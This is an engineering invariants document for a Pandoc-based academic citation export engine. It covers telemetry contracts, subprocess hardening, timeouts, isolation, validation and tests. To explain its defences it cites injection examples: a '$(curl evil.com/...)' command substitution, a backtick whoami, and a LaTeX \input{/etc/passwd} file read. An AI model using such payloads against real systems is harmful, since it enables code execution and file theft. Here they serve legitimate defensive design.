# Academic formatting engine — invariants

## Why this rule exists

ResearchOne competes against Elicit, Consensus, Scite, and OpenEvidence
on the same tier the academic and patent buyer tribes recognize: can
this thing produce a document I can submit, file, or cite without
remediation? Industry-wide AI bibliographies hallucinate 26–60% of
references (per the strategic doc). ResearchOne's structural answer
is to map every citation to an evidence card, hand the deterministic
CSL-JSON to Pandoc, and produce output a peer reviewer or patent
examiner can accept without a manual remediation pass.

The formatting engine is the surface where this promise has to land.
Mistakes here — a wrong author order, a stripped DOI, a hallucinated
year — destroy the audit-grade positioning. The Pandoc subprocess
also runs untrusted markdown through a shell context, which makes
this the highest-risk security surface in the codebase.

This rule exists so those two concerns — correctness and security —
do not erode under iteration.

## Invariants

### I-1. The cross-WO contract with WO-U is binding

`citation_formatter` is added to `REASONING_MODEL_ROLES` in this WO.
Per Cursor rule 25 invariant I-9, the SAME commit that adds the role
MUST add `case 'citation_formatter': return 'Citation Mapping';` to
`rolePhaseFor()` in `backend/src/services/telemetry/costSidecar.ts`.

Without that, the new role buckets as "Other" in the cost analytics
dashboard and the Citation Mapping phase shows up as empty —
breaking the WO-U analytics promise.

This is enforceable via grep: any PR that touches
`REASONING_MODEL_ROLES` MUST also touch `costSidecar.ts:rolePhaseFor`
in the same diff. See the pre-commit check below.

### I-2. Pandoc receives untrusted content through stdin, never argv

ALL untrusted strings (report markdown body, evidence card text,
citation queries) MUST flow into the Pandoc subprocess via stdin or
a tempfile written under a job-scoped scratch directory. NEVER via
command-line arguments.

Reason: shell injection is the highest-impact attack on this surface.
A user report body containing `$(curl evil.com/...)` or
`` `whoami` `` becomes shell-evaluated if interpolated into a
command line. Through stdin, it's a byte stream pandoc parses as
input — not as shell.

The `pandocRunner.ts` API exposes ONLY a function that takes
`(markdownString, options)` and never accepts a "command line override"
or "extra args" parameter. If you find yourself wanting to add such
a parameter, you're trying to violate this invariant. Don't.

### I-3. xelatex runs with `-no-shell-escape`

Pandoc's PDF path delegates to xelatex. xelatex's `\write18` mechanism
allows arbitrary shell command execution from a TeX document. Pandoc
must be invoked with `--pdf-engine-opt=-no-shell-escape` to disable
this. The `pandocRunner.ts` invocation hard-codes this flag.

Even with `-no-shell-escape`, TeX is a Turing-complete macro system
that can exhaust memory or run forever. We mitigate this with `timeout`
(I-4) and a memory cap via cgroup or `ulimit -v` (I-5).

### I-4. Every Pandoc invocation has a wall-clock timeout

`pandocRunner.ts` wraps the subprocess in `timeout(1)` with a
configured ceiling (default 30 seconds for DOCX, 60 seconds for PDF).
A timed-out export returns a structured error to the user; it never
hangs the worker indefinitely.

Per `docs/V2_OUTAGE_POSTMORTEM_2026-04-28-PM.md`: a process without a
timeout is a process that eventually wedges. The worker pool is small
and recovery from a wedged pandoc would require manual intervention
in prod. Always set the timeout.

### I-5. Every Pandoc invocation runs in an isolated scratch directory

A per-job directory under `/tmp/r1-export-<uuid>/` holds the
markdown, the CSL-JSON, the bibliography YAML, and the output file.
The directory is created at job start, passed to pandoc as `--data-dir`
or via `cd`, and removed in a `finally` block.

Pandoc has filesystem reach. Without isolation, a malicious
`@import` or LaTeX `\input{/etc/passwd}` could exfiltrate local
files. With per-job tempdirs and `-no-shell-escape`, the blast radius
is contained to the job's own scratch directory.

### I-6. The system dep is gated by a runtime check, not a deploy flag

`pandocAvailable()` runs `pandoc --version` once at process startup
and caches the result. If pandoc is not installed (dev environment,
deploy in progress, container rebuilt without the system package),
the export endpoint returns HTTP 200 with `{available: false,
reason: 'pandoc_not_installed', detail: '...'}`.

Per Cursor rule 13 deploy-skew tolerance applied to system binaries.
The frontend `ReportExportButton` renders disabled with a tooltip
explaining the missing dep. The application does not 500 because of
a missing system package.

### I-7. CSL-JSON conversion is a pure function with snapshot tests

`cslConverter.ts:sourceToCslJson()` is a pure function — `(source row)
→ CSL-JSON object`. Every test case in `__tests__/cslConverter.test.ts`
is a snapshot of (input row, expected JSON). When pandoc / CSL semantics
demand a schema change, the test fixtures update in the same PR.

Per Cursor rule 16: if a future PR changes the field mapping (e.g.
`publication` → `publisher` instead of `container-title`), the
snapshot must update OR the test fails. Either way, the change is
visible in the diff.

### I-8. Lossless Evidence Aliases are stable within a report version

Aliases `[E1]`, `[E2]`, ... are assigned ONCE per (report_id,
citation_id) and stored in `evidence_aliases`. A re-export of the
same report version produces the same aliases in the same order.

When a revision creates a new report version (per WO-T), aliases are
regenerated for the new report — they are NOT shared across versions.
This preserves the "stable within a published artifact" property:
once a report is exported and cited externally, the alias mapping is
frozen.

### I-9. Format / style parameters are validated against enums

`format` ∈ `{'docx', 'pdf', 'md', 'html'}`. `style` ∈
`{'mla', 'apa', 'chicago-author-date', 'chicago-note', 'ieee', 'harvard'}`.
The API route validates with an enum check; invalid values return
HTTP 400 (not pass-through to pandoc — pandoc's error messages can
leak filesystem paths).

Per Rule 26 I-2 analogy: server-side enum validation, no free-text
writes to a subprocess parameter.

### I-10. Tests must fail without the fix (Cursor rule 16)

The load-bearing assertions:

- `cslConverter.test.ts` — every row → JSON mapping is snapshotted.
  Revert any field mapping and the relevant snapshot test fails.
- `pandocRunner.test.ts` — shell-injection regression. A markdown
  body containing backticks, `$()`, `&&`, `;` is passed through. The
  test asserts pandoc produces a DOCX with the literal characters
  in the body — NOT an executed shell command.
- `evidenceAliaser.test.ts` — assign aliases for a fixed set of
  citations, re-run, assert identical aliases (idempotency / I-8).
- `costSidecar.test.ts` (existing) — `rolePhaseFor('citation_formatter')`
  returns `'Citation Mapping'`. This test is added in this WO to the
  EXISTING file, and is the regression tripwire for the Rule 25 I-9
  cross-WO contract.

## Pre-commit check

- [ ] If you touched `REASONING_MODEL_ROLES`, you also touched
      `costSidecar.ts:rolePhaseFor`. Mechanical:
      ```bash
      git diff --name-only | grep -E "reasoningModelPolicy\.ts|costSidecar\.ts"
      # Both files must appear, or you're in violation of I-1.
      ```
- [ ] No `exec`, `execSync`, `spawn`, or `spawnSync` call passes
      user-supplied content as an argv element. Grep:
      ```bash
      grep -rn "exec\|spawn" backend/src/services/formatting/ | \
        grep -v "__tests__" | grep -v "pandocRunner.ts"
      # Should be empty. Only pandocRunner.ts may call out to subprocess.
      ```
- [ ] `pandocRunner.ts` invocation includes `'-no-shell-escape'` and
      a `timeout` arg. Grep:
      ```bash
      grep "no-shell-escape\|timeout" \
        backend/src/services/formatting/pandocRunner.ts
      ```
- [ ] If you added a new format or style, you added enum entries in
      `formatExportEnums.ts`, a `pandocRunner.ts` case if it needs
      special arg handling, AND a frontend dropdown option in the
      same commit.
- [ ] No reference templates (.docx, .csl) ship from a non-vendored
      source. All ship from `backend/src/services/formatting/templates/`
      committed to the repo.
